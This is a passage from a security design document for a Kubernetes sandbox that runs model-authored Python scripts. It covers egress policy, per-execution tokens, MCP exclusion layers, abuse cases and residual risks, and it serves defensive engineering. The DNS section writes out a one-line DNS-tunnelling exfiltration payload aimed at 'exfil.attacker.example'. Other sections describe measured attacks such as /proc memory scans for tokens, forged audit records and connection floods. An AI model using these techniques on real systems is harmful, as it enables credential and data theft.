uniform error shape, deliberately: the probe reads only the status code, and a client polling
for recovery wants `busy`/`queued` in the 503 too. **A busy supervisor is healthy** — reporting
`503` under load would drop the pod out of the Service endpoints mid-execution, and with one
replica every retry then fails against no endpoint at all.

**`POST /execute` — request.**

| field | type | required | absent or malformed |
|---|---|---|---|
| `code` | string, UTF-8 Python source | yes | absent, not a string, or blank → `400`; over the cap → `413`. Measured on the UTF-8 encoding of the decoded string, not on the JSON-escaped bytes — escaping can triple the on-wire length of the same program. |
| `execution_id` | lowercase uuid4, `\A…\Z`, full match | yes | absent or non-matching → `400`. The supervisor must not mint one. The anchors are not fastidiousness: `$` also matches before a final newline, and this value names a directory and is echoed back. |
| `tokens` | object, exactly `db-api` and `results-api`, compact JWS strings | yes | a missing key, an extra key or a non-string → `400`. Never run without them. |
| `user` | authenticated end-user email | yes | absent or empty → `400`; must equal the tokens' `sub`. |
| `session_id` | chat session id | yes | absent or empty → `400`; must equal the tokens' `sid`. |
| `timeout_s` | integer seconds within the wall-clock bounds | no | absent → the default. Non-integer, ≤ 0, or over the ceiling → **`400`, not clamped**. |

**Reject, do not clamp**, and **refuse, do not pick a winner.** Clamping is a silent behaviour
change on a path fed from a model-influenceable direction, and it desyncs the client's own
deadline. Likewise the supervisor decodes each token's payload *without verifying the
signature* — it holds no signing key, deliberately and permanently — purely to check its
caller's own consistency: the two `jti` must agree with each other and with `execution_id`,
each `aud` with the key it was sent under, each `sub` with `user` and `sid` with `session_id`.
A mismatch is `400`, and `exp` already past **at dequeue** is `409 TokenExpired`. Preferring
the `jti` would name the directory one thing and stamp the audit another; preferring the body
would hand the child credentials whose `jti` joins to no directory.

`execution_id` is one value in three roles — the `/scratch` directory name, both tokens' `jti`,
and the join key that lines up the audit records, db-api's `endpoint_access` lines and
chat-backend's manifest record. A **repeated** id is `409 DuplicateExecutionId` whenever the
directory exists, live or still retained: reusing it would merge two runs into a manifest
chat-backend already recorded, and wiping would delete artifacts `read_artifact` may still be
serving. That is a normal event rather than a client bug, which is why it has a specified
outcome. After a `429` the client re-mints a fresh `execution_id` too, not just fresh tokens.

**Timeout semantics.** The wall clock is measured **from the fork**, so queue wait does not
count against the script. On expiry the supervisor signals the child's process group, kills
after the grace, reaps, and still answers `200` with `status: "timeout"` and whatever output
was captured.

**The client's own deadline must be `max queued wait + timeout_s + margin`**, not `timeout_s`:
the supervisor may hold a request for the full queued wait *and then* run it for the full
timeout. A client that sets it lower times out on an execution the supervisor is about to
answer — and because a running child is deliberately not killed on disconnect, that client's
retry then queues behind the child it abandoned.

**When the client goes away.** A **queued** request whose connection has closed is dropped at
dequeue and never forked: nobody is waiting, and running it would spend the pod's only slot and
a credential nobody will use. A **running** child is *not* killed — it completes, is reaped,
its manifest is written and its artifacts are retained; the undeliverable response is
discarded. Killing it would destroy artifacts the retention window promises, and
peer-disconnect detection while nobody is reading the socket is unreliable enough that a false
positive would kill live executions.

**`POST /execute` — response.** It does not stream: one request, one response, after the child
has been reaped. `200` means the supervisor ran the script and is reporting what happened,
**including a script that raised, timed out or was killed** — non-2xx is reserved for the
supervisor refusing or being unable to run it at all.

| field | type | notes |
|---|---|---|
| `execution_id` | string | echo of the request value |
| `status` | `"ok"` \| `"error"` \| `"timeout"` \| `"limit"` | `ok` = exited 0; `error` = non-zero exit or uncaught exception; `timeout` = wall clock; `limit` = a supervisor limit fired |
| `exit_code` / `signal` | integer or `null` | kept separate rather than folded into `128+n`, which loses which of the two happened |
| `duration_ms` | integer | child wall clock, fork to reap; excludes queue wait |
| `output` | string, always present | stdout and stderr interleaved, one window, lossily decoded |
| `output_bytes` | integer | total read from the pipe before capping |
| `output_truncated` | boolean | true iff `output` was elided **or** the pipe cap fired |
| `error` | object or `null` | present iff `status != "ok"`: `type`, `message`, `traceback`, `limit` |
| `artifacts` | array, always present | the manifest: `name`, `size`, `content_type`, nothing else |
| `artifacts_omitted` | integer ≥ 0 | present in the directory, not listed retrievably |
| `artifacts_retained_in_clear` | boolean | the seal pass could **neither encrypt nor delete** what the script wrote |

The response carries no token, no filesystem path, no environment and no host name.

`output` is one field rather than two because the budget is one window and the traceback the
model needs is at the tail; splitting it either halves the window or doubles the budget. It is
decoded with `errors="replace"` and there is **no base64 and no `encoding` field** — a client
that has to branch on encoding will eventually get the branch wrong, and a script with binary
to return writes an artifact. The elision marker is fixed text so truncation is recognisable
without heuristics, and it is *additional* to the byte budget.

`artifacts_retained_in_clear` is deliberately **not** folded into `artifacts_omitted`. That
count means "produced, present, not listed" and cannot distinguish "destroyed everything" from
"destroyed nothing"; this says the bytes are still readable at the shared uid.

<!-- BEGIN GENERATED: error-types -->

Reserved `error.type` names — the supervisor emits no others for these conditions and a client may branch on them: `ArtifactQuota`, `Killed`, `MemoryLimit`, `NonZeroExit`, `OutputLimit`, `PidLimit`, `ScratchQuota`, `StartupFailure`, `Timeout`.

The other half of `error.type`'s range is the child's own exception class name, which is why the field is an open string. `_sanitise_error_type` refuses a child-supplied value over 64 bytes, one that is not a dotted identifier, and any reserved name — so a script cannot forge one.

Reserved but never emitted: `Killed`, `MemoryLimit`, `NonZeroExit`, `StartupFailure`. The memory ceiling is `RLIMIT_AS`, applied by the child to itself, so what comes back is the child's own `MemoryError` on the open half of the range. The name stays reserved only so a script cannot forge it.

<!-- END GENERATED: error-types -->

**The artifact manifest** carries one entry per retrievable file and its shape is dictated by
what `read_artifact` can consume: a **bare name**, never a path, never an execution id, never a
URL. An entry carrying any of those would name something the read refuses by construction, and
an execution id in the manifest would invite a model-supplied one back in. The supervisor lists
a file only if it would survive that read — a regular file directly in the artifacts directory,
`st_nlink == 1`, no symlinks, FIFOs, sockets or devices, no recursion, and a name that is valid
UTF-8 with no control characters and no leading or trailing whitespace. The whitespace rule is
not cosmetic: the executor strips the name *before* validating, so `"plot.png "` would pass
every other rule, get listed, and then be unretrievable behind the same indistinguishable
"Artifact not found" a name that never existed gets. `content_type` is derived from the name
and must not be sniffed from content, because the read recomputes it the same way.

**`GET /artifact?execution_id=…&name=…`** returns one file base64 in the same JSON envelope, so
this route answers in the same shape as every other and the outgoing cap stays a single choke
point. See section 6 for who may read what.

---

## 3. Egress policy

Default-deny, both directions. The sandbox is a leaf: it is called, it does not call back.

<!-- BEGIN GENERATED: network -->

**`allow-ingress-sandbox`** — selects `app: sandbox`, policyTypes Ingress

- ingress: `app: chat-backend` on 8080/TCP

**`sandbox-egress`** — selects `app: sandbox`, policyTypes Egress

- egress: `app: db-api` on 8080/TCP
- egress: `app: results-api` on 4000/TCP

The receiving end has to admit it too — a sandbox egress allow is necessary and not sufficient against the namespace's `default-deny-ingress`:

- `allow-ingress-db-api` admits `app: sandbox` on 8080/TCP
- `allow-ingress-results-api` admits `app: sandbox` on 4000/TCP

<!-- END GENERATED: network -->

**Label contract.** A `podSelector` that matches no pod is not an error — it is silent
no-coverage, and since this is the only egress policy in the namespace a label mismatch yields
a sandbox with *unrestricted* egress and no signal anywhere. `scripts/test-network-policies.py`
is the offline guard: it parses every file in `k8s/network-policies/` at once, because
NetworkPolicies are additive and "mcp-server cannot reach the sandbox" is a property of all of
them together, and it fails on any rule that selects the sandbox and admits mcp-server —
including a from-less rule, which admits everything.

**Committed is not enforced, and the offline guard cannot tell the difference.** Everything
above is a statement about files. A cluster enforces whatever was last applied to it, and
nothing in a deploy reconciles the two afterwards, so a policy edited by hand or an apply that
never happened leaves the guard green over an unenforced control. Measured 2026-09-01 on a
checkout passing every offline check: the daly-production cluster had six policies —
`allow-ingress-auth-gateway`, `-bff`, `-chat-backend`, `-frontend`, `-mcp-server`,
`-results-api` — whose single ingress rule carried no `from:` at all and therefore admitted
every source in the namespace, and it was not enforcing `allow-ingress-sandbox` or
`sandbox-egress` at all. `LIVE_POLICY_CHECK=true` turns on the diff that sees this: it reads
the namespace's NetworkPolicies with `kubectl get` (read-only, and `KUBE_CONTEXT` picks the
cluster) and compares each against its committed counterpart on podSelector, policyTypes,
ingress and egress rule count, **rules carrying no `from:`/`to:` at all**, peer selectors and
ports. It is off by default because `deploy.sh` and `build.sh` run this harness on hosts that
may hold no kubeconfig; when it is on and the cluster cannot be read, the harness exits 2
rather than reporting a clean run.

Read the egress table as a statement about **data**, not endpoints: a third-party annotation
source is unreachable because no rule can match it, whereas **anything results-api serves is
reachable**, including artefacts it merely relays from GCS, since the sandbox's token is not
scoped per route and a script can hand-roll HTTP whether or not a wrapper exists.

**Denied by omission, each load-bearing:** the internet (no `ipBlock` rule of any kind — no
`pip install`, no mining payload, nowhere to POST results); keycloak and its database;
rag-service and chat-backend (denying chat-backend also means a script cannot re-enter the chat
API with the caller's session); and **mcp-server**, which closes the obvious laundering route —
a script that could reach mcp-server would inherit its permission through
`allow-ingress-db-api` and its whole registered tool surface.

**169.254.169.254 is not something this policy is written to cover, and the policy is not what
makes it safe.** Link-local traffic is exactly the class already proven exempt from
NetworkPolicy on this dataplane in the *ingress* direction, so the egress direction had to be
measured rather than inferred — and it was, from inside the running sandbox pod on
daly-staging on 2026-08-31: the metadata root path and the token path (both with
`Metadata-Flavor: Google`), the link-local kubelet source `169.254.4.6` on 80 and 10250, and
the node addresses `10.0.0.9` on 80 and 10250 and `10.0.0.8` on 10250 all timed out at a 6 s
timeout. Read that as a fact about the substrate it was taken on — Cilium v1.18 under
`datapathProvider: ADVANCED_DATAPATH` — which is also what would invalidate it; re-measure
after a dataplane change instead of citing this paragraph. What is load-bearing is still the
node pool: `GKE_METADATA` mode plus no Workload Identity binding for the KSA (the sandbox KSA
carries no `iam.gke.io/gcp-service-account` annotation), so even a policy-engine gap yields no
usable GCP credential.

### On DNS: none, and `hostAliases` instead

An earlier draft allowed kube-dns and booked DNS tunnelling as a low-bandwidth residual "at a
few hundred bytes per query". That was wrong by three orders of magnitude. A pod with egress to
CoreDNS sustains on the order of 10³ queries/second at ~200 usable base32 bytes per query name
— **~200 KB/s, tens of megabytes inside the wall clock**. It needs no POST and no response:
`socket.getaddrinfo(b32(chunk) + ".exfil.attacker.example")` is the whole payload, and the
resolver walks it upstream to the attacker's authoritative server for free. A GCP access token
is about 1 KB, so five queries.

So: no kube-dns rule, and `hostAliases` pinning db-api and results-api to their ClusterIPs,
substituted by `deploy.sh` at deploy time. **All four name forms per IP** (bare, `.genetics`,
`.genetics.svc`, `.genetics.svc.cluster.local`), because the `files` NSS module does no
search-domain expansion. `/etc/nsswitch.conf` must list `files` before `dns` — absent the file,
glibc defaults to `dns [!UNAVAIL=return] files` and every lookup stalls the full resolver
timeout before it reaches `hostAliases`, which `readOnlyRootFilesystem` makes unfixable at
runtime. That is asserted twice, at build time and at supervisor startup.

The operational cost is the residual: a Service deleted and recreated out of band leaves the
sandbox pointing at a dead IP until it is re-rendered and rolled. **A stale IP cannot become a
wrong destination** — the policy selects pods, not IP blocks, and Dataplane V2 evaluates egress
post-DNAT, against the identity of the pod the connection actually lands on. Traffic to a
reused ClusterIP resolves to a workload the policy does not permit and is dropped. The
stale-IP failure mode is a connection error in every case, never a silent misdelivery.

---

## 4. Credentials

**The sandbox never holds `INTERNAL_API_SECRET`.** That secret authenticates the *service*, not
the *request*; it does not expire; and a script that reads it can reach db-api and results-api
directly and forever, from anywhere those services are reachable. It already leaked into
model-authored scripts once — that is what `_ALLOWED_ENV_KEYS` is scar tissue from.

A network policy is not a sufficient substitute either. mcp-server is permitted through
`allow-ingress-db-api` and is itself reachable from outside, so anything that could drive
mcp-server could reach BigQuery behind it. The sandbox must not become a second instance of
that shape: its network position and its credential must *both* be narrow.

**The credential.** chat-backend mints, per execution, **two** HS256 JWTs — one per audience,
so a token captured from a results-api request cannot be replayed at db-api — signed with a
dedicated `SANDBOX_TOKEN_SIGNING_KEY`, deliberately not `INTERNAL_API_SECRET`: separate key,
separate blast radius, independent rotation. Chosen over an opaque token plus introspection
because db-api is stateless and has no store, and introspection would require it to call
chat-backend, inverting the dependency direction.

| claim | value | purpose |
|---|---|---|
| `iss` | `"chat-backend"` | rejects tokens minted by anything else |
| `aud` | `"db-api"` or `"results-api"` | prevents cross-service replay |
| `sub` | authenticated user email | attribution to a person |
| `sid` | chat session id | makes `endpoint_access` lines attributable to a conversation |
| `jti` | the execution id | the join key across chat-backend, the sandbox and db-api |
| `iat`, `exp` | 5-minute lifetime | the wall clock is at most 120s; the slack covers a slow BigQuery job started at the last moment |
| `scope` | `"query:views"` | a hook for later per-view narrowing; **only its presence is checked** |

**Clock skew, and why the TTL only covers half of it.** The TTL absorbs skew in the *past*
direction. It does nothing forward: PyJWT ≥ 2.10 raises `ImmatureSignatureError` as soon as
`iat > now`, so a verifier whose clock runs a fraction of a second behind the minter's rejects a
freshly minted token outright. Both verifiers pass `leeway=5`, which applies to `exp`, `nbf` and
`iat` alike and does **not** loosen the 300s bound — the max-age check is separate code that
compares `iat` against `time.time()` directly and stays exact.

**How the tokens reach the script.** In the **body of the POST**, never in the pod spec, a
ConfigMap or a Secret — chat-backend cannot set environment variables on a running pod, and a
pod-spec value would turn a per-execution credential into a static pod-lifetime one. The
supervisor writes them to a mode-0600 file under `/scratch/<id>` and puts only its **path** in
the child's environment, because `/proc/<pid>/environ` is readable at the shared uid. The SDK
reads the file once and unlinks it.

**The file is not an exposure bound, and read-once-and-unlink closes nothing by itself.** A
detached `setsid()` grandchild of an *earlier* execution was measured reading this execution's
file inside that window, and a raw `/proc/self/mem` scan in the child recovered tokens from
executions that had already completed. The **memory** route is closed by the fork server. The
**same-uid resident** route is closed for a resident of an earlier execution (the subreaper
sweep) and open for one of the same execution. What the file is genuinely load-bearing for is
different: the child needs its credential and the fork server must not carry it, so a file the
supervisor writes and the child opens is a route from one to the other that does not pass
through the process in between.

**Validation must not inherit fail-open.** db-api's `require_auth` begins
`if not INTERNAL_API_SECRET … : return`, with a startup warning as the only signal. That is
deliberate for the shared-secret path and unacceptable for the sandbox path, which is the one
caller whose input is attacker-influenced. The rules:

1. A sandbox-shaped bearer is routed to the sandbox validator **before** the unset-secret early
   return can short-circuit it.
2. **Discriminate on the JOSE header, never by counting dots.** "Three dot-separated segments"
   matches every RS256 Google Identity Token as well; using it would 401 that entire class of
   caller. Base64url-decode the first segment unverified, read `alg`, and route to the sandbox
   validator only when it is `HS256`. The header selects a *validator*, never a key or an
   algorithm to trust.
3. Every claim in the table is required and validated. A failure is a hard `401` — never a
   fallthrough to another auth path.
4. The response caps are **defaults for every request**, relaxed for a verified non-sandbox
   principal, rather than sandbox-audience penalties. Otherwise presenting a *weaker*
   credential buys *looser* limits, which is the wrong gradient.
5. results-api enforces a response-**byte** cap and no row cap. The row counter recognised only
   JSON while TSV is the default format of every bulk range endpoint, and parsing the buffered
   body to count was itself a memory amplifier. Its byte cap is likewise a default for all
   requests, relaxed for the shared secret, a Google id_token or a per-user API token, because
   auth-gateway sends real users straight there with no shared secret.
6. **db-api and results-api refuse to start** when `SANDBOX_ENABLED` is true and either secret
   is unset. The trigger is the sandbox being deployed, not the signing key being present — with
   the trigger on the key, a deployment carrying *neither* secret never fires the check, boots
   fail-open, and the sandbox reaches it by sending no `Authorization` header at all.
7. `SANDBOX_TOKEN_SIGNING_KEY` is in `deploy.sh`'s secret-existence gate, so the pair cannot be
   deployed apart in the first place.

---

## 5. MCP exposure

**People must not be able to execute code via MCP calls.** Three layers enforce it, and each is
independently required: the design assumes any one can be defeated by a future refactor, a
config change or a mistake, and requires that the other two still hold.

**Layer 1 — registration.** `run_analysis` and `read_artifact` are in mcp-server's *hardcoded*
disabled set, not the env-driven half. `run_analysis` additionally has no `@mcp.tool()` block
at all, which matters because a disabled set can only subtract. A tool is registered on `/mcp`
from the moment its definition exists unless it is excluded, so each exclusion landed in the
same change that defined the tool. `list_capabilities` is deliberately *not* excluded: an
exclusion set padded with names that are not security controls stops reading as a security
control.

**Layer 2 — NetworkPolicy.** The sandbox's ingress rule admits chat-backend only; mcp-server is
denied at the network layer. Read it as a **hop-level** control, not a capability-level one: the
namespace admits mcp-server to chat-backend, mcp-server holds both `INTERNAL_API_SECRET` and
`CHAT_BACKEND_URL`, and chat-backend is the one pod the sandbox admits — so
`mcp-server → chat-backend → sandbox` is open at the network level by construction. That
transitive path is held shut by layer 1 and by the identity check, not by this policy.

**Layer 3 — tests.** `tests/test_mcp_server.py` asserts the two names are absent from the
**actual `/mcp` tool list**, enumerated from the live `FastMCP` instance rather than from the
constant: asserting on the constant tests that someone typed the name, asserting on the tool
list tests that the registration path honoured it. Two further assertions: registering with an
**empty** disabled set still does not produce `run_analysis` (the property configuration cannot
undo), and the name is present in the constant (the property an operator greps for). The
route-level assertion ships as an **import-graph** assertion — importing `mcp_server` in a
subprocess must leave `sandbox_client` out of `sys.modules` — which is the stronger form while
`chat_api` is a separate app that is never mounted, and must be rewritten as route enumeration
if that ever changes. `register_proxy_tools` is an accepted residual: a tool an external MCP
server contributes under the name `run_analysis` routes to that server and cannot reach our
sandbox client.

**Why layer 1 alone is insufficient.** The disabled set is assembled at runtime from mutable
inputs and there is a second registration path filtered by a different set, so a name omitted
from a list is one refactor away from being re-registered. mcp-server's reachability is broad —
not behind oauth2-proxy, four bearer paths, one of whose audiences anyone with a Google account
can mint against. And the precedent is already in this repo: mcp-server sits on both sides of
`allow-ingress-db-api`, so anything that could drive it could reach BigQuery behind it. With
all three layers, the worst case from a registration mistake is a tool that appears in the list
and fails every invocation with a connection error — noisy, visible, and not code execution.

---

## 6. Abuse cases and the control that stops each

| abuse | control |
|---|---|
| Crypto mining / CPU burn | the CPU limit, the wall clock, and no egress to a pool or a payload |
| Exfiltration via db-api | the per-request caps (defaults, not penalties), `endpoint_access` attribution by `sub`/`sid`/`jti`, and no network path off the cluster |
| Exfiltration via DNS | eliminated: no kube-dns egress, `hostAliases` only |
| Resource exhaustion starving chat-backend | separate pod, separate node pool, its own cgroup limits; the queue is bounded in depth *and* wait |
| Reading another user's data on disk | retained artifacts are sealed under a per-execution key; the live window is not closed |
| Serving another user attacker-controlled bytes | the manifest's digests, re-checked on the way out |
| Persisting across executions | `/scratch/<id>` is per-execution and wiped; unrecognised entries are wiped at startup; the runtime-supplied `/tmp` and `/dev/shm` — which the pod spec neither declares nor can remove — are wiped before every fork; the fork server sweeps what reparents to it |
| Executing code via MCP | section 5's three layers |

### `read_artifact`: lifecycle, authorization, and what the retention window serves

The tool takes an artifact **name**, never a path and never a model-supplied execution id.
chat-backend resolves it server-side against executions owned by the requesting **user and**
chat session — the `(sub, sid)` pair, since `sid` arrives in the request body and authorizes
nothing on its own — and `404`s otherwise. Name collisions within one `(sub, sid)` key resolve
to the most recently completed still-retained execution that produced the name. It then proxies
over HTTP to the sandbox and performs **no local filesystem access at all**: the descriptor
checks run inside the sandbox pod, against the directory the hostile child actually wrote to.
`SUBAGENT_ALLOWED_PATHS` never gains a reader.

**The `execution_id` is the authorisation on the HTTP surface, and the qualifier is
load-bearing.** It is a uuid4 minted per execution, equal to the tokens' `jti`, never rendered
to the model, and there is no route that lists execution ids — so combined with the ingress
policy it has exactly the standing `/execute` has. **It is not a filesystem property.**
`/scratch` is fully enumerable by any process at the shared uid; measured from inside a second
execution's child, which listed it, found a previous execution's directory and read its
`artifacts/private.csv`. The id bounds who can ask *the supervisor* for bytes; it bounds nothing
about who can open the file.

**What the window serves: the bytes the manifest described, or nothing.** The same measurement
showed the peer artifact could be overwritten and a new file planted beside it, so for the
retention window this route would have handed attacker-controlled content back under another
user's execution id with every descriptor check satisfied. `build_manifest` therefore hashes
every file it lists and keeps the map **in the supervisor's memory** — never on the filesystem,
since a manifest written to `/scratch` would be forged in the same breath as the file it
describes. On the way out: a name **not in the manifest** is `404`, refused before it is
opened; a name whose **bytes have changed** is `409 ArtifactModified`, a distinct answer on
purpose, because a caller holding a legitimate id and a manifest that named the file is
entitled to know the answer is "this is no longer what you were told about" rather than a `404`
it would read as an expired window; a file larger than the read cap is listed with no digest,
so a later truncation makes it unverifiable rather than servable.

**Artifact encryption at rest.** Between the reap and the manifest the supervisor seals the
retained artifacts in place with AES-256-GCM under a per-execution key that exists only in its
memory and is never written anywhere; the read opens them again on the way out. The associated
data binds the execution id **and** the name, so a sealed file moved between names or lifted
into another execution fails authentication.

**The property is "a retained directory is sealed or empty", and it is structural.** Stated
over the directory rather than over every artifact because the second sentence was measurably
false: the seal pass runs on the completion path, so any exception out of `_execute_inner`
propagated past it and the directory was retained for the whole window with the child's
plaintext where it wrote it — the original demonstrated attack, reproduced against the sealed
build. It is now enforced on the retain path itself, which every route to retention passes
through.

**What it does and does not close.** It closes the cross-execution read of a **completed**
execution. It does **not** close the live window: the child writes plaintext with a raw
`open()` into its own artifacts directory and there is no SDK chokepoint to intercept, so a
same-uid resident reading *during* an execution is untouched. Nor does it make the key
unreachable — the key inherits exactly what the digest map has, YAMA `ptrace_scope=1` plus the
supervisor being the child's **ancestor**, and **not** seccomp: `RuntimeDefault` allows
`ptrace`, measured. Under runsc, uid 0 could write `ptrace_scope=0`, so "no uid 0 in the
sandbox" is load-bearing here rather than hygiene.

**Deletion is not covered by any of this.** A same-uid process can still delete a retained
artifact, and the answer is then an honest `404`.

### The audit trail, and what it is worth

The SDK writes one record per call on a dedicated fd; the supervisor holds the read end and
re-parses, re-frames and re-stamps every record from the **tokens'** `sub`/`sid`/`jti` before
putting it on the pod's stdout. Every cap — per-record bytes, per-execution bytes, rate — is
applied there, by the process the child cannot reach into, and none is keyed on anything the
child writes. In-SDK controls were defeated by running them: records were forged with a logger
call and with `os.write` to the fd number the script reads from its own environment, and
silenced with `logger.disabled`, the level, a filter and handler removal.

So attribution and framing are trustworthy: a child cannot name another user, cannot break the
bracket framing, and cannot put text outside the admitted record shapes on an operator's
stream. **The records are still not an account of what a script did.** A script can emit
well-formed records for calls it never made, `client._executor.<method>()` reads data with no
record at all, and a child can lose its own records by flooding its pipe (bounded and counted)
or by suppressing them inside its own process, where nothing on the read end can see it happen
— the summary a suppressing script produces is byte-identical to one that made no calls. **A
zero-record summary means "this supervisor read no records".** Under an assumption of
compromise, db-api's and results-api's own `endpoint_access` lines, written outside this pod,
are what hold.

---

## 7. Residual risk

Stated plainly. This design contains code execution; it does not make it safe in the abstract.

1. **gVisor escape.** gVisor reduces the kernel attack surface; it does not remove it, and it
   has had its own CVEs. An escape reaches the sandbox node — which is why that node runs a
   dedicated, minimally-privileged service account rather than the suite's. What an escape
   yields is node-local logging/monitoring/registry-pull identity plus whatever the node's
   network position allows, not BigQuery and GCS. It is still an escape.
2. **Stale `hostAliases` after an out-of-band Service recreation.** Loud (connection errors),
   never a silent misdelivery — see section 3.
3. **An authorized user can still extract data manually.** They could before, through the
   browser and the existing tools. The sandbox is not sold as preventing this.
4. **Wrong answers.** Nothing here makes a model-authored analysis scientifically correct. An
   injected or merely confused script can produce a plausible, wrong result inside every
   control listed above. This is the risk the sandbox does not address at all, and it is
   arguably the most likely one to occur.
5. **db-api's shared-secret path is still fail-open, and this design widens its exposure.** An
   unset `INTERNAL_API_SECRET` still makes `require_auth` return early for any request that is
   not a sandbox-shaped bearer. Today that is reachable only by chat-backend and mcp-server,
   both of which run code the suite authored; this design adds a caller that runs
   *attacker-authored* code and gives it a network path, and the fail-open is reachable from it
   by sending **no `Authorization` header at all**. Rules 4 and 6 in section 4 narrow it. What
   genuinely remains: a deployment with the sandbox **not** deployed and the secret unset is
   still fail-open for chat-backend and mcp-server traffic — pre-existing, not fixed here — and
   rule 6 is a *startup* check, so it constrains configuration rather than runtime.
6. **No PodDisruptionBudget for the sandbox.** Node auto-upgrade or repair kills an in-flight
   script; the model sees an error and retries. A *blocking* budget would be actively harmful:
   the pool is pinned at one node, so an unsatisfiable budget would stall every upgrade and
   repair of it.
7. **The intra-execution window.** Everything the fork server and the subreaper sweep bound is
   *between* executions. A process forked by execution A is alive for the whole of A by
   construction, and reparents only when A's child exits; anything it does to A's own directory
   it does before the sweep runs. And the sweep itself is **unverified under gVisor**, which
   implements `prctl` and `/proc` in the sentry; a subreaper that does not take degrades to the
   old behaviour and says so in the log.
8. **Duration is bounded, count is not.** The three read deadlines bound how long one
   connection can hold a handler thread; nothing caps concurrent connections or threads. The
   binding constraint is the pod task budget: roughly 16 silent connections per second, sending
   zero bytes, pins the pod at `pod_pids_limit`, after which `fork()` fails and `/execute`
   cannot run. Note the gradient — sending *zero* bytes is governed by the long idle bound and
   is therefore ~6.5x cheaper per connection than sending one. And the response **write** is
   unbounded: a client that sends a well-formed request and never reads the answer parks a
   handler in `write` for as long as it likes. The drain deadline bounds what that costs at
   shutdown; nothing bounds it during normal service.
9. **Timing and cost side channels.** A script can infer the existence of rows it cannot read
   by timing queries or observing `maximum_bytes_billed` failures. Not mitigated; the caller is
   an authorized user of those datasets anyway.

---

## Verification: which harness proves what

| harness | proves | needs |
|---|---|---|
| `scripts/test-supervisor.py` | the wire contract, the queue, every supervisor limit watched *firing*, the artifact manifest and its integrity binding, encryption at rest, the fork server and its failure paths, cross-execution memory isolation, the bounded header read, the head deadlines, descriptor ownership, the shutdown gate, PID 1 orphan reaping | nothing: no cluster, no credentials, no image |
| `scripts/test-supervisor.py --container URL` | the same wire checks against the real image, plus the read-only rootfs, the pruned venv, the seeded font cache and the absence of credentials in the child's environment | a container from `scripts/run-sandbox-local.sh` |
| `scripts/test-network-policies.py` | the egress and ingress allow-lists, the three MCP-exclusion layers, the `SANDBOX_ENABLED` pairing, the label contract — all of the *committed* union | the manifests; one live cluster call for the sandbox probe |
| `LIVE_POLICY_CHECK=true scripts/test-network-policies.py` | that a cluster is enforcing that union — per policy, and reporting all of them rather than the first | read-only `kubectl get` against the cluster `KUBE_CONTEXT` names |
| `scripts/test-sandbox-docs.py` | the shipped schema docs and stubs cover every view and the SDK's exported surface exactly, and no placeholder survives | a genetics-mcp-server checkout |
| `scripts/gen-doc-blocks.py --check` | the generated tables in this document still match the code | nothing |
| `scripts/test-e2e-local.py` | `run_analysis` end to end against the local stack, including what an execution leaves behind | the local stack |
| `sandbox/build-checks.py` | the final image's properties, from the builder stage | the image build |

Two conventions run through those harnesses and are what make them evidence rather than
ritual. **A control is driven as the failure**: every group that asserts a hazard is closed also
restores the defect — usually by swapping in the pre-fix source, selected by a
`SUPERVISOR_TEST_*` environment variable — and asserts the same probe then goes red. Several of
those checks passed vacuously before their control existed. And **anything about a hang is
driven on a thread with a deadline**, so a regression fails the check rather than wedging the
harness.

What is **not** covered: the live connection test from the mcp-server pod to the sandbox
Service. It needs a deployed cluster and has not been run. The other member of that pair —
whether this dataplane enforces egress to a link-local address — no longer belongs here: it was
measured from inside the running pod and the drop held, with the substrate that makes the
result reproducible recorded beside it in section 3.
